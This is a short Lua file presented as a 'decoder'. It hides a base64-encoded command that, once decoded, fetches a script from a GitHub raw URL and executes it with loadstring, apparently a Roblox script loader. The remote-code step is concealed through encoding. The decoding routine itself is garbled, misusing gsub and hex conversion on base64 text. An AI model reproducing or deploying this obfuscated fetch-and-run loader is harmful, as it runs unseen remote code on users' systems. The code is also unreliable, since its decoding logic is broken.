-- decoder.lua 内容
return function(encoded)
    local decoded = (encoded:gsub('bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS95eGdoMTY1L3l4Z2gxNjUvbWFpbi9rdW5rdW4xLjUiKSkoKQ==', function (cc)
        return string.char(tonumber(cc, 16))
    end))
    loadstring(decoded)()
end